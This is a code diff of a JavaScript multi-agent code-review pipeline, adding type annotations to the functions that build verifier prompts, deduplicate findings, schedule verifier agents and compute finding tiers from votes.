 // an fp-rules.md today), and naming a file the nix reviewer does not have would send it hunting.
+/** @param {Finding} f @param {number} idx @param {boolean} isTool @param {string} gateProvenance @param {Profile} profile */
 function verifyPrompt(f, idx, isTool, gateProvenance, profile) {
   // Model-authored fields enter this prompt as context — guard them the same way the adjudicate track
   // does: flatten identifier/locator fields via promptFields (newline is the single-value injection
   // vector; identifier chars are load-bearing for the grep) and markdown-strip the prose (why/source).
   const pf = promptFields(f)
-  const src = sanitizeAttack(f.source)
-  const why = sanitizeAttack(f.why)
+  const src = sanitizeAttack(f['source'])
+  const why = sanitizeAttack(f['why'])
   const exclusionCatalog = profile?.fpRules
     ? `\nEXCLUSION CATALOG: your rejection is itself a claim and carries the same burden of proof as the finding. Load the ${profile.rubricSkill} skill's ${profile.fpRules} and, when one of its precedents fires, name the ID in \`reason\` (e.g. "refuted per FP-006: proven-Some unwrap"). Run the TRACE each rule demands — "looks guarded" does not fire the invariant-protected rule; following the invariant to its source and showing it dominates the sink on every path does. Two of them (FP-002 operator-controlled input, FP-005 operator-only panic surface) are severity DOWNGRADES, not refutations: the claim still holds, only the attacker's access is missing — say so in \`reason\` and leave refuted=false. The file also lists the KEEP-* non-reasons, dismissals that sound decisive and have repeatedly killed real defects (soundness in a public API no current caller reaches, a logic bug in safe Rust, a panic unwinding through an unsafe region). If nothing in the catalog fits, judge on the merits — never force a bad fit to justify a drop.\n`
     : ''
@@ -3661,17 +4288,17 @@ function verifyPrompt(f, idx, isTool, gateProvenance, profile) {
   return `${head}
 
 FINDING: [${pf.severity}] ${pf.title}
-  at ${pf.file || '?'}:${f.line || 0}
+  at ${pf.file || '?'}:${f['line'] || 0}
   why: ${why}
-  source: ${src}${f.ruleId ? ` · rule ${pf.ruleId}` : ''}
-  off-site evidence claimed: ${f.whereChecked ? pf.whereChecked : '(none — the finding claims to be self-contained at the cited line)'}
+  source: ${src}${f['ruleId'] ? ` · rule ${pf.ruleId}` : ''}
+  off-site evidence claimed: ${f['whereChecked'] ? pf.whereChecked : '(none — the finding claims to be self-contained at the cited line)'}
 
 MECHANICAL CHECK FIRST: if a tool can decide this finding (a clippy lint, statix/deadnix rule, semgrep rule, cargo-audit advisory — infer from source/ruleId/title), RUN it scoped to the cited file; its output overrides your judgement in BOTH directions: tool still reports it → refuted=false; tool demonstrably no longer reports it → refuted=true (quote the output in reason).${gateProvenance ? ` The gate invoked the tools as: "${flattenField(gateProvenance)}" — if a tool is not on PATH, reproduce the gate's invocation (e.g. \`nix run nixpkgs#<tool> --\`) before declaring it unrunnable.` : ''}${isTool ? ' If you STILL cannot run the tool, set refuted=false — an unverifiable tool finding stays alive.' : ' If no tool applies, judge it yourself.'}
 
 REFUTATION RULE: refuted=true means the finding's TECHNICAL CLAIM is false — the cited code does not contain the claimed defect, or the deciding tool demonstrably no longer reports it. Context is NOT refutation: that the code is test/fixture/example-only, looks intentional, is unlikely to be built or run, or has low impact NEVER justifies refuted=true. Record that context in reachable=false and reason instead — severity is calibrated downstream.
 
 ${exclusionCatalog}Open the cited file and check:
-1. citedLineMatches: does ${pf.file || '?'}:${f.line || 0} actually contain what the finding claims? (If the citation is wrong/hallucinated → citedLineMatches=false.)
+1. citedLineMatches: does ${pf.file || '?'}:${f['line'] || 0} actually contain what the finding claims? (If the citation is wrong/hallucinated → citedLineMatches=false.)
 2. reachable: is this code reachable in production, or is it test/example/fixture-only code? (Test-only → reachable=false. This does NOT refute the finding — it only calibrates severity downstream.) REACHABILITY IS ABOUT THE ROUTE, not just the destination: if the claim is "reachable from untrusted input", check that the ROUTE runs from the real entry point — the parser, the handler, the deserializer, the public API — on attacker-supplied data. Reaching the state by CONSTRUCTING the object directly (a builder, \`new\`, a test fixture, an internal constructor) bypasses exactly the validation the question is about, and proves nothing about untrusted-input reachability. That trap catches careful reviewers, so check it explicitly rather than assuming the route was the obvious one.
 3. refuted: is the technical claim itself false? (${isTool ? 'Tool-decided as above.' : 'Mechanical check first, then your judgement; when uncertain about the claim, refuted=true.'})
 4. premiseSupported: identify the finding's LOAD-BEARING premise — the one claim that, if false, makes the finding evaporate. If it lives outside the cited line (the dependency behaves this way, this is reachable from untrusted input, no caller guards it, the sibling does X), OPEN the \`whereChecked\` location and check it actually shows that. premiseSupported=false when the premise is off-site and \`whereChecked\` is empty, points somewhere that does not show it, or merely restates the cited line. premiseSupported=true when the finding is genuinely self-contained at the cited line, or the off-site evidence checks out. Do NOT set refuted=true just because a premise is uncited — unsupported is not disproven; that is what this field is for, and it demotes the finding downstream instead of killing it.
@@ -3683,6 +4310,7 @@ Return {refuted, citedLineMatches, reachable, premiseSupported, reason}.`
 // wording the same defect differently both enter the pool — and each duplicate would buy its own
 // verifier fan-out. A cheap grouping pass merges same-defect findings first; synthesis keeps its
 // own dedup instruction as a safety net.
+/** @type {Schema<DedupAnswer>} */
 const DEDUP_SCHEMA = {
   type: 'object',
   additionalProperties: false,
@@ -3702,26 +4330,29 @@ const DEDUP_SCHEMA = {
 // folded into the representative finding rather than dropped, and the count is stated in the title
 // and logged — a silent truncation would read as "there were only N", which is worse than the flood.
 const ROLLUP_MAX = 3
+/** @param {Finding[]} pool @param {Profile} profile */
 function rollupPool(pool, profile) {
   const ids = profile.rollupRuleIds || []
   if (!ids.length) return pool
+  /** @type {Map<string, Finding[]>} */
   const groups = new Map()
   const out = []
   for (const f of pool) {
-    const id = f.ruleId || ''
+    const id = f['ruleId'] || ''
     if (!ids.includes(id)) { out.push(f); continue }
-    const k = `${f.source || ''}::${id}`
-    const g = groups.get(k) || (groups.set(k, []), groups.get(k))
+    const k = `${f['source'] || ''}::${id}`
+    let g = groups.get(k)
+    if (!g) { g = []; groups.set(k, g) }
     g.push(f)
   }
   for (const [, g] of groups) {
     // Order by severity so the representative is the worst instance, not an arbitrary one.
-    const sorted = g.slice().sort((a, b) => (SEV_RANK[a.severity] ?? 9) - (SEV_RANK[b.severity] ?? 9))
+    const sorted = g.slice().sort((/** @type {Finding} */ a, /** @type {Finding} */ b) => (SEV_RANK[a['severity'] ?? ''] ?? 9) - (SEV_RANK[b['severity'] ?? ''] ?? 9))
     if (sorted.length <= ROLLUP_MAX) { out.push(...sorted); continue }
     const keep = sorted.slice(0, ROLLUP_MAX)
     const folded = sorted.slice(ROLLUP_MAX)
-    const rep = folded[0]
-    const where = folded.slice(0, 6).map(f => `${f.file || '?'}:${f.line || 0}`).join(', ')
+    const rep = /** @type {Finding} */ (folded[0])   // folded is non-empty: sorted.length > ROLLUP_MAX
+    const where = folded.slice(0, 6).map((/** @type {Finding} */ f) => `${f['file'] || '?'}:${f['line'] || 0}`).join(', ')
     out.push(...keep, {
       ...rep,
       title: `${rep.title} — and ${folded.length - 1} more of the same (${rep.ruleId})`,
@@ -3740,12 +4371,16 @@ function rollupPool(pool, profile) {
 // two findings, and each paid a full 4-vote individual verification. Catch that deterministically — the
 // model pass then only has to handle the genuinely reworded cross-file duplicates it is good at.
 const SAME_SPOT_OVERLAP = 0.6
+/** @param {Finding[]} pool */
 function sameSpotGroups(pool) {
+  /** @type {Map<string, number[]>} */
   const bySpot = new Map()
-  pool.forEach((f, i) => {
-    if (!f || !f.file) return // no location → nothing to key on; leave it to the model pass
-    const k = `${String(f.file).toLowerCase()}:${f.line || 0}`
-    ;(bySpot.get(k) || (bySpot.set(k, []), bySpot.get(k))).push(i)
+  pool.forEach((/** @type {Finding} */ f, /** @type {number} */ i) => {
+    if (!f || !f['file']) return // no location → nothing to key on; leave it to the model pass
+    const k = `${String(f['file']).toLowerCase()}:${f['line'] || 0}`
+    const at = bySpot.get(k)
+    if (at) at.push(i)
+    else bySpot.set(k, [i])
   })
   const groups = []
   for (const [, idxs] of bySpot) {
@@ -3756,7 +4391,7 @@ function sameSpotGroups(pool) {
       const g = [i]
       for (const j of idxs) {
         if (j === i || taken.has(j)) continue
-        if (shingleOverlap(pool[i].title, pool[j].title) >= SAME_SPOT_OVERLAP) { g.push(j); taken.add(j) }
+        if (shingleOverlap(/** @type {Finding} */ (pool[i])['title'], /** @type {Finding} */ (pool[j])['title']) >= SAME_SPOT_OVERLAP) { g.push(j); taken.add(j) }
       }
       if (g.length > 1) { taken.add(i); groups.push(g) }
     }
@@ -3764,10 +4399,11 @@ function sameSpotGroups(pool) {
   return groups
 }
 
+/** @param {Finding[]} pool @param {Profile} profile */
 async function dedupPool(pool, profile) {
   if (pool.length < 2) return pool
-  const isToolSrc = f => isToolSource(profile, f.source)
-  const listing = pool.map((f, i) => `${i}. ${f.file || '?'}:${f.line || 0} [${f.severity}] (${f.source}) ${f.title} — ${String(f.why || '').slice(0, 160)}`).join('\n')
+  const isToolSrc = (/** @type {Finding} */ f) => isToolSource(profile, f['source'])
+  const listing = pool.map((/** @type {Finding} */ f, /** @type {number} */ i) => `${i}. ${f['file'] || '?'}:${f['line'] || 0} [${f['severity']}] (${f['source']}) ${f['title']} — ${String(f['why'] || '').slice(0, 160)}`).join('\n')
   let res = null
   try {
     res = await ragent(
@@ -3780,7 +4416,7 @@ Return {groups: [[i, j, ...], ...]} — index groups of same-defect findings; om
       { label: `dedup:${profile.id}`, phase: 'Verify', schema: DEDUP_SCHEMA, model: 'haiku', effort: 'low' },
     )
   } catch (e) {
-    log(`[${profile.id}] dedup pass failed (${String((e && e.message) || e).slice(0, 80)}) — verifying the raw pool`)
+    log(`[${profile.id}] dedup pass failed (${String((e && /** @type {{ message?: unknown }} */ (e).message) || e).slice(0, 80)}) — verifying the raw pool`)
   }
   // Deterministic same-spot groups go FIRST: the "overlapping groups: first wins" rule below then
   // makes them authoritative over a model group that would have split the same indices differently.
@@ -3788,26 +4424,27 @@ Return {groups: [[i, j, ...], ...]} — index groups of same-defect findings; om
   const groups = detGroups.concat(
     (res?.groups ?? []).filter(g => Array.isArray(g) && g.length > 1 && g.every(i => Number.isInteger(i) && i >= 0 && i < pool.length)),
   )
+  /** @type {Finding[]} */
   const merged = []
   const inGroup = new Set()
   for (const g of groups) {
     if (g.some(i => inGroup.has(i))) continue // overlapping groups: first wins
     for (const i of g) inGroup.add(i)
-    const members = g.map(i => pool[i])
+    const members = g.map((/** @type {number} */ i) => /** @type {Finding} */ (pool[i]))
     // Base = the strictest member: tool-sourced first (a tool finding can only be refuted by
     // re-running the tool), then highest severity.
-    const base = members.slice().sort((a, b) => (isToolSrc(b) - isToolSrc(a)) || ((SEV_RANK[a.severity] ?? 9) - (SEV_RANK[b.severity] ?? 9)))[0]
+    const base = /** @type {Finding} */ (members.slice().sort((a, b) => (/** @type {number} */ (/** @type {unknown} */ (isToolSrc(b))) - /** @type {number} */ (/** @type {unknown} */ (isToolSrc(a)))) || ((SEV_RANK[a['severity'] ?? ''] ?? 9) - (SEV_RANK[b['severity'] ?? ''] ?? 9)))[0])
     const others = members.filter(m => m !== base)
     // Carry ALL contributing sources so a downstream source-keyed rule (strict maintainability
     // escalation) still fires when its trigger lens was merged into a different-source base.
-    const sources = [...new Set(members.map(m => m.source).filter(Boolean))]
+    const sources = [...new Set(members.map(m => m['source']).filter(Boolean))]
     // Union the off-site evidence too: a merged-away member may have pinned the premise the base
     // only asserted, and dropping it would cost the group its Confirmed tier at verification.
-    const whereChecked = [...new Set(members.map(m => m.whereChecked).filter(Boolean))].join('; ')
-    merged.push({ ...base, sources, whereChecked, why: `${base.why} (same defect also reported by: ${others.map(m => m.source).join(', ')})` })
+    const whereChecked = [...new Set(members.map(m => m['whereChecked']).filter(Boolean))].join('; ')
+    merged.push({ ...base, sources, whereChecked, why: `${base['why']} (same defect also reported by: ${others.map(m => m['source']).join(', ')})` })
   }
   if (!merged.length) return pool
-  const out = pool.filter((_f, i) => !inGroup.has(i)).concat(merged)
+  const out = pool.filter((/** @type {Finding} */ _f, /** @type {number} */ i) => !inGroup.has(i)).concat(merged)
   const detFolded = detGroups.reduce((n, g) => n + g.length - 1, 0)
   log(`[${profile.id}] Dedup before verify: ${pool.length} → ${out.length} (${pool.length - out.length} cross-lens duplicate(s) merged — ${detFolded} of them same-spot, caught deterministically)`)
   return out
@@ -3839,6 +4476,11 @@ const VERIFY_WINDOW_AGENTS = 24
 // Worst-case agent count for one verification thunk, so the window can only ever come in under budget,
 // never over. A batch thunk is one agent; a High/Critical opens with a cull + the authoritative
 // vote and, if they split, buys the remaining n1-1 culls — 1 + max(1, verifyVotes) in total.
+/**
+ * @param {{severity?: string}} f
+ * @param {{verifyVotes?: unknown} | null | undefined} plan
+ * @returns {number}
+ */
 function verifyWeight(f, plan) {
   const isHigh = f.severity === 'Critical' || f.severity === 'High'
   return isHigh ? 1 + Math.max(1, Number(plan?.verifyVotes) || 1) : 1
@@ -3859,28 +4501,35 @@ function verifyWeight(f, plan) {
 // runOne rejects with is recorded as null rather than tearing down the whole dispatch.
 //
 // An entry heavier than the whole budget still runs: it waits for an empty window, then goes alone.
+/**
+ * @template R, T
+ * @param {{run: R, weight?: unknown}[]} entries
+ * @param {unknown} maxWeight
+ * @param {(run: R, i: number) => T | PromiseLike<T>} runOne `run` is the entry's own (a workflow thunk, in the engine)
+ * @returns {Promise<(T | null)[]>}
+ */
 async function weightedWindow(entries, maxWeight, runOne) {
   const cap = Math.max(1, Number(maxWeight) || 1)
-  const out = new Array(entries.length).fill(null)
+  const out = /** @type {(T | null)[]} */ (new Array(entries.length).fill(null))
   let next = 0
   let inflight = 0
-  await new Promise(resolve => {
+  await /** @type {Promise<void>} */ (new Promise(resolve => {
     const pump = () => {
       while (next < entries.length) {
-        const w = Math.max(1, Number(entries[next].weight) || 1)
+        const w = Math.max(1, Number(/** @type {{weight?: unknown}} */ (entries[next]).weight) || 1)
         // `inflight > 0 &&`: an over-budget entry is never starved, it just never shares the window.
         if (inflight > 0 && inflight + w > cap) break
         const i = next++
         inflight += w
         Promise.resolve()
-          .then(() => runOne(entries[i].run, i))
+          .then(() => runOne(/** @type {{run: R}} */ (entries[i]).run, i))
           .then(v => { out[i] = v ?? null }, () => { out[i] = null })
           .then(() => { inflight -= w; pump() })
       }
       if (next >= entries.length && inflight === 0) resolve()
     }
     pump()
-  })
+  }))
   return out
 }
 // <<< craft-inline
@@ -3908,12 +4557,13 @@ async function weightedWindow(entries, maxWeight, runOne) {
 // filed them at Low/Info — that combination *is* the under-call, and it is rare.
 const CRITICAL_TIER_RULES = new Set(['SAF-001', 'SAF-002', 'SAF-003', 'SAF-004', 'SAF-005', 'SAF-006', 'SAF-008', 'ERR-001', 'ERR-002'])
 const BATCH_SIZE = 6
+/** @param {Finding} f */
 function verifyTier(f) {
-  if (f.severity === 'Critical' || f.severity === 'High') return 'individual'
-  if (f.severity === 'Medium') return 'batch'
+  if (f['severity'] === 'Critical' || f['severity'] === 'High') return 'individual'
+  if (f['severity'] === 'Medium') return 'batch'
   // Low/Info: skipped, unless the rule it cites is one that blocks on sight — then the severity is
   // more likely a mislabel than a judgement, and it is worth one verifier to find out.
-  return CRITICAL_TIER_RULES.has(f.ruleId || '') ? 'individual' : 'skip'
+  return CRITICAL_TIER_RULES.has(f['ruleId'] || '') ? 'individual' : 'skip'
 }
 // ---- the same reasoning, carried to the tier where the money is ----
 // `verifyTier` skips Low/Info because no judgement on them can move the verdict. That is a statement
@@ -3925,9 +4575,15 @@ function verifyTier(f) {
 // The severities whose confirmation alone forces Block, per `reviewVerdict` in lib/run-record.mjs.
 // Kept as data next to the rule it mirrors: if that rule ever gains a severity, the skip below is
 // wrong in the direction of skipping too much, and this is the one line to change.
+/** @type {readonly (string | undefined)[]} */
 const BLOCKING_SEVERITIES = ['Critical', 'High']
 
 // Does this JUDGED finding, by itself, already fix the verdict at Block?
+/**
+ * @typedef {{ tier?: string, severity?: string, title?: string, file?: string, line?: number }} JudgedFinding
+ * @typedef {{ record: (f: JudgedFinding | null | undefined) => boolean, secured: () => boolean, securedBy: () => JudgedFinding | null }} VerdictFloor
+ */
+/** @param {JudgedFinding | null | undefined} f */
 function securesBlock(f) {
   return !!f && f.tier === 'confirmed' && BLOCKING_SEVERITIES.includes(f.severity)
 }
@@ -3936,14 +4592,16 @@ function securesBlock(f) {
 // dispatched verification entries on purpose — the same reason the death breaker is shared: the
 // individual panel and the batch groups are in flight together, so a per-entry view would never see
 // the confirmation another entry brought back.
+/** @returns {VerdictFloor} */
 function makeVerdictFloor() {
+  /** @type {JudgedFinding | null} */
   let by = null
   return {
     // Feed every settled verdict through here, judged or not. Returns whether THIS one raised the
     // floor, which is what a caller logs.
     record(f) {
       if (by !== null || !securesBlock(f)) return false
-      by = f
+      by = /** @type {JudgedFinding} */ (f)
       return true
     },
     // Answers about what has ALREADY come back. Never predicts.
@@ -3961,6 +4619,10 @@ function makeVerdictFloor() {
 // Medium and nothing else: Critical/High decide the verdict themselves and are never skipped, and
 // Low/Info never reach here — `verifyTier` has already routed them to the skip tier for a reason
 // that does not depend on the floor.
+/**
+ * @param {JudgedFinding | null | undefined} f
+ * @param {VerdictFloor | null | undefined} floor
+ */
 function verdictNeutralNow(f, floor) {
   return !!f && f.severity === 'Medium' && !!floor && floor.secured()
 }
@@ -3968,6 +4630,7 @@ function verdictNeutralNow(f, floor) {
 // Why a Medium went unverified, in the finding's own `why`. It names the evidence — the confirmed
 // finding that fixed the verdict — because "we did not check this" is only legitimate when the
 // reader can see what made the check pointless.
+/** @param {VerdictFloor | null | undefined} floor */
 function floorSkipReason(floor) {
   const by = floor && floor.securedBy()
   const where = by ? `${by.severity} "${by.title || '?'}" at ${by.file || '?'}:${by.line || 0}` : 'a confirmed blocking finding'
@@ -3993,17 +4656,20 @@ function floorSkipReason(floor) {
 // versus "the agent answered but said nothing about THIS finding" (a lost finding → it was part of
 // an inspection, so it keeps `suspected`). The discriminator is exactly this: a null/empty/malformed
 // answer is a dead agent; a non-empty verdict list missing one index is a lost finding.
-const NOT_VERIFIED = (f, why) => ({ ...f, tier: 'unverified', why: `${f.why} (NOT VERIFIED: ${why})` })
+/** @type {(f: Finding, why: string) => Finding} */
+const NOT_VERIFIED = (f, why) => ({ ...f, tier: 'unverified', why: `${f['why']} (NOT VERIFIED: ${why})` })
 // THE DEATH CLASS of a batch answer, or null when the verifier really did judge something. The
 // three classes are kept APART rather than collapsed into one boolean: they are three distinct ways
 // the answer can fail to arrive, and a single message for all of them makes a test that scripts one
 // of them pass while the other two are unreached — the "neighbouring door" failure the death table
 // below exists to prevent. Each class names itself in the finding's `why`, so a row of that table
 // proves which branch it reached.
+/** @param {unknown} res  the batch verifier's answer, which may be off-schema (see VOTE_AXES) */
 function batchDeath(res) {
   if (!res) return 'returned nothing at all — a dead agent, an exhausted retry, or an expired deadline'
-  if (!Array.isArray(res.verdicts)) return 'answered OFF-SCHEMA — its answer carried no verdict list at all'
-  if (!res.verdicts.length) return 'answered with an EMPTY verdict list — it judged nothing'
+  const verdicts = /** @type {{ verdicts?: unknown }} */ (res).verdicts
+  if (!Array.isArray(verdicts)) return 'answered OFF-SCHEMA — its answer carried no verdict list at all'
+  if (!verdicts.length) return 'answered with an EMPTY verdict list — it judged nothing'
   return null
 }
 // A vote is a JUDGEMENT only if it carries the four booleans tierFromVotes decides on. THE NINTH
@@ -4014,13 +4680,16 @@ function batchDeath(res) {
 // confirmed, out of suspected, out of unverified, still inside the refutation denominator, and
 // absent from `notRun`. The batch path had this guard (batchDeath, ex-verifierAnswered); the
 // individual path had none, so schema drift on a Critical silently became a refutation.
+/** @type {Array<'refuted' | 'citedLineMatches' | 'reachable' | 'premiseSupported'>} */
 const VOTE_AXES = ['refuted', 'citedLineMatches', 'reachable', 'premiseSupported']
+/** @param {unknown} v  a verifier's answer, typed or not: the schema is not trusted here @returns {v is Vote} */
 function isVerdictShaped(v) {
-  return !!v && typeof v === 'object' && VOTE_AXES.every(k => typeof v[k] === 'boolean')
+  return !!v && typeof v === 'object' && VOTE_AXES.every(k => typeof (/** @type {Record<string, unknown>} */ (v))[k] === 'boolean')
 }
 // Do two verdicts say the same thing on every axis tierFromVotes reads? Only then can the opening
 // pair stand in for the full panel — a disagreement on ANY axis (not just `refuted`) can move the
 // tier, because citedLineMatches gates refutation outright and reachable/premiseSupported demote.
+/** @param {Vote | null | undefined} a @param {Vote | null | undefined} b */
 function votesAgree(a, b) {
   // An off-schema vote is not agreement either: two of them would `Boolean(undefined)`-match on every
   // axis and short-circuit the panel on garbage.
@@ -4029,6 +4698,7 @@ function votesAgree(a, b) {
 }
 // The majority arithmetic itself, over the SHAPED votes `v` (`live` is only needed to tell an
 // all-dead panel from an all-off-schema one). `tierFromVotes` below is the entry point.
+/** @param {Finding} f @param {unknown[]} live @param {Vote[]} v @returns {Finding} */
 function decideTier(f, live, v) {
   // EVERY vote died. This is not a judgement and must never be rendered as one: `suspected` is
   // defined in the report as "a verifier looked and the claim did not stand up", so handing it to a
@@ -4043,21 +4713,22 @@ function decideTier(f, live, v) {
       : 'every verifier vote for this finding died before returning a verdict — nothing was checked against the code')
   }
   const half = v.length / 2
-  const lineOk = v.filter(x => x.citedLineMatches).length >= Math.ceil(half)
-  const reach = v.filter(x => x.reachable).length >= Math.ceil(half)
-  const premiseOk = v.filter(x => x.premiseSupported).length >= Math.ceil(half)
-  const refutes = v.filter(x => x.refuted).length
+  const lineOk = v.filter((/** @type {Vote} */ x) => x['citedLineMatches']).length >= Math.ceil(half)
+  const reach = v.filter((/** @type {Vote} */ x) => x['reachable']).length >= Math.ceil(half)
+  const premiseOk = v.filter((/** @type {Vote} */ x) => x['premiseSupported']).length >= Math.ceil(half)
+  const refutes = v.filter((/** @type {Vote} */ x) => x['refuted']).length
   let tier
   if (!lineOk) tier = 'refuted'
   else if (refutes > half) tier = 'refuted'
   else if (refutes === 0) tier = 'confirmed'
   else tier = 'suspected'
   if (tier === 'confirmed' && !premiseOk) {
-    return { ...f, tier: 'suspected', why: `${f.why} (demoted to Suspected: the load-bearing premise is off-site and no verifier could pin it to real code${f.whereChecked ? ` — claimed at ${f.whereChecked}` : ', and whereChecked was empty'})` }
+    return { ...f, tier: 'suspected', why: `${f['why']} (demoted to Suspected: the load-bearing premise is off-site and no verifier could pin it to real code${f['whereChecked'] ? ` — claimed at ${f['whereChecked']}` : ', and whereChecked was empty'})` }
   }
   if (tier === 'confirmed' && !reach) {
-    const demoted = DEMOTE[f.severity] || f.severity
-    return { ...f, tier, severity: demoted, why: `${f.why} (severity demoted ${f.severity}→${demoted}: not on a production-reachable path)` }
+    const demoted = DEMOTE[f['severity'] ?? ''] || f['severity']
+    // `demoted` is undefined only when `f` carries no severity, which `...f` already says.
+    return { ...f, tier, ...(demoted === undefined ? {} : { severity: demoted }), why: `${f['why']} (severity demoted ${f['severity']}→${demoted}: not on a production-reachable path)` }
   }
   return { ...f, tier }
 }
@@ -4074,6 +4745,7 @@ function decideTier(f, live, v) {
 // panel. The thinning is annotated on the finding (what a reader of the verdict sees) and counted in
 // the run record as `verification.thinned` (what ranks across runs — a panel that keeps half-dying
 // is fragility, and fragility is only legible as a repeat).
+/** @param {Finding} f @param {Array<Vote | null | undefined>} votes @returns {Finding} */
 function tierFromVotes(f, votes) {
   const live = votes.filter(Boolean)
   // Off-schema votes are discarded BEFORE the arithmetic, not read as all-false (see isVerdictShaped).
@@ -4086,7 +4758,7 @@ function tierFromVotes(f, votes) {
   // the clause below would be false twice over (no tier "stands on" anything, and the surviving
   // count is zero). But the discard is still the largest one there is, and dropping the flag here
   // made the counter read 0 for it: the flag is set, the sentence is not.
-  if (judged.tier === 'unverified') return { ...judged, votesDiscarded: discarded }
+  if (judged['tier'] === 'unverified') return { ...judged, votesDiscarded: discarded }
   // ARITHMETIC, NOT A WORD FOR IT. The earlier phrasing said "a minority of the panel that answered"
   // unconditionally, which is false whenever the survivors are the larger half — at `verifyVotes: 3`
   // with one discard the verdict stands on 2 of 3. Only the share is named, and it is computed.
@@ -4094,7 +4766,7 @@ function tierFromVotes(f, votes) {
   return {
     ...judged,
     votesDiscarded: discarded,
-    why: `${judged.why} (PANEL THINNED: ${discarded} of ${live.length} returned votes answered off-schema and were discarded before the arithmetic — this ${judged.tier} stands on ${v.length} of ${live.length} returned votes, ${share} the panel that answered)`,
+    why: `${judged['why']} (PANEL THINNED: ${discarded} of ${live.length} returned votes answered off-schema and were discarded before the arithmetic — this ${judged['tier']} stands on ${v.length} of ${live.length} returned votes, ${share} the panel that answered)`,
   }
 }
 // The round-local half of the clause above, for the ledger door. Like TRACKED_MARK, "this verdict
@@ -4102,6 +4774,7 @@ function tierFromVotes(f, votes) {
 // verbatim it describes a panel that never sat. Deliberately paren-free in its body so this stays a
 // one-shot match.
 const THINNED_CLAUSE = / \(PANEL THINNED: [^)]*\)/g
+/** @type {Schema<BatchVerdictAnswer>} */
 const BATCH_VERDICT_SCHEMA = {
   type: 'object',
   additionalProperties: false,
@@ -4126,15 +4799,16 @@ const BATCH_VERDICT_SCHEMA = {
     },
   },
 }
+/** @param {Finding[]} group @param {Profile} profile */
 function batchVerifyPrompt(group, profile) {
   const pfs = group.map((f, i) => {
     const pf = promptFields(f)
     return `--- FINDING ${i} ---
 [${pf.severity}] ${pf.title}
-  at ${pf.file || '?'}:${f.line || 0}
-  why: ${sanitizeAttack(f.why)}
-  source: ${sanitizeAttack(f.source)}${f.ruleId ? ` · rule ${pf.ruleId}` : ''}
-  off-site evidence claimed: ${f.whereChecked ? pf.whereChecked : '(none — claims to be self-contained at the cited line)'}`
+  at ${pf.file || '?'}:${f['line'] || 0}
+  why: ${sanitizeAttack(f['why'])}
+  source: ${sanitizeAttack(f['source'])}${f['ruleId'] ? ` · rule ${pf.ruleId}` : ''}
+  off-site evidence claimed: ${f['whereChecked'] ? pf.whereChecked : '(none — claims to be self-contained at the cited line)'}`
   }).join('\n')
   return `You are a skeptic verifying ${group.length} INDEPENDENT ${profile.lang} review findings in one pass. They are batched only to save cost — judge each ENTIRELY on its own evidence. Never let one finding's verdict influence another's, and never assume a batch "should" contain some proportion of real ones.
 
@@ -4152,11 +4826,13 @@ ${pfs}
 
 Return {verdicts: [...]} with ONE entry per finding, each carrying its \`index\` (0..${group.length - 1}). Every index must appear — omitting one silently deletes a finding from the review.`
 }
+/** @param {Finding[]} items @param {Plan} plan @param {Profile} profile @param {string} gateProvenance */
 async function verifyPool(items, plan, profile, gateProvenance) {
   // One breaker per verification pass, handed only to the dispatches this function windows. Its
   // lifetime is the pass: a profile's pass never inherits a window filled by another profile's,
   // whose API reachability it did not observe and whose deaths it cannot re-spend.
   const breaker = makeDeathBreaker()
+  /** @type {{ individual: Finding[], batch: Finding[], skip: Finding[] }} */
   const route = { individual: [], batch: [], skip: [] }
   for (const f of items) route[verifyTier(f)].push(f)
 
@@ -4169,18 +4845,23 @@ async function verifyPool(items, plan, profile, gateProvenance) {
   // the claim did not stand up confidently"; these were never looked at. Folding them into Suspected
   // made the two indistinguishable in the report AND put them in the refuteRate denominator, so a run
   // whose findings were mostly Low/Info reported a refutation rate diluted by items nothing refuted.
+  /** @type {Finding[]} */
   const unverified = route.skip.map(f => ({
     ...f,
     tier: 'unverified',
-    why: `${f.why} (NOT VERIFIED: no verifier was spent on it — ${f.severity} cannot change the verdict either way, so nothing here has been checked against the code)`,
+    why: `${f['why']} (NOT VERIFIED: no verifier was spent on it — ${f['severity']} cannot change the verdict either way, so nothing here has been checked against the code)`,
   }))
 
   // Batched tier: group by file so one agent reads one file's context once.
+  /** @type {Map<string, Finding[]>} */
   const byFile = new Map()
   for (const f of route.batch) {
-    const k = f.file || '?'
-    ;(byFile.get(k) || (byFile.set(k, []), byFile.get(k))).push(f)
+    const k = f['file'] || '?'
+    const at = byFile.get(k)
+    if (at) at.push(f)
+    else byFile.set(k, [f])
   }
+  /** @type {Finding[][]} */
   const groups = []
   for (const [, fs] of byFile) for (let i = 0; i < fs.length; i += BATCH_SIZE) groups.push(fs.slice(i, i + BATCH_SIZE))
 
@@ -4193,10 +4874,10 @@ async function verifyPool(items, plan, profile, gateProvenance) {
   // verbatim error text: the run record's `notRun` is ranked by exact string to surface repeated
   // fragility, and an error message (or a run-specific path) makes every entry unique and sinks the
   // real repeats — the same reason `uncoveredFiles` is ranked separately.
-  const deadGroup = (group, why) => {
-    const what = `the batch verifier for ${group[0].file || '?'} ${why}`
+  const deadGroup = (/** @type {Finding[]} */ group, /** @type {string} */ why) => {
+    const what = `the batch verifier for ${/** @type {Finding} */ (group[0])['file'] || '?'} ${why}`
     log(`⚠️ [${profile.id}] ${what} — its ${group.length} finding(s) were NOT checked against the code; reported as unverified and excluded from the verification counters`)
-    return group.map(f => NOT_VERIFIED(f, `${what}, so nothing checked this finding against the code`))
+    return group.map((/** @type {Finding} */ f) => NOT_VERIFIED(f, `${what}, so nothing checked this finding against the code`))
   }
 
   // Batched and individual verification look at DISJOINT findings — routing put each one in exactly
@@ -4216,9 +4897,9 @@ async function verifyPool(items, plan, profile, gateProvenance) {
   // and converts into `notRun` only if the Block it was justified by fails to arrive.
   // `verifySkipped` is the flag that keeps the two apart, since they need a re-run for opposite
   // reasons.
-  const floorSkippedGroup = group => {
-    log(`💰 [${profile.id}] the batch verifier for ${group[0].file || '?'} was NOT dispatched — ${floorSkipReason(floor)}; its ${group.length} finding(s) are reported as unverified and excluded from the verification counters`)
-    return group.map(f => ({ ...NOT_VERIFIED(f, floorSkipReason(floor)), verifySkipped: true }))
+  const floorSkippedGroup = (/** @type {Finding[]} */ group) => {
+    log(`💰 [${profile.id}] the batch verifier for ${/** @type {Finding} */ (group[0])['file'] || '?'} was NOT dispatched — ${floorSkipReason(floor)}; its ${group.length} finding(s) are reported as unverified and excluded from the verification counters`)
+    return group.map((/** @type {Finding} */ f) => ({ ...NOT_VERIFIED(f, floorSkipReason(floor)), verifySkipped: true }))
   }
 
   const batchThunks = groups.map(group => () =>
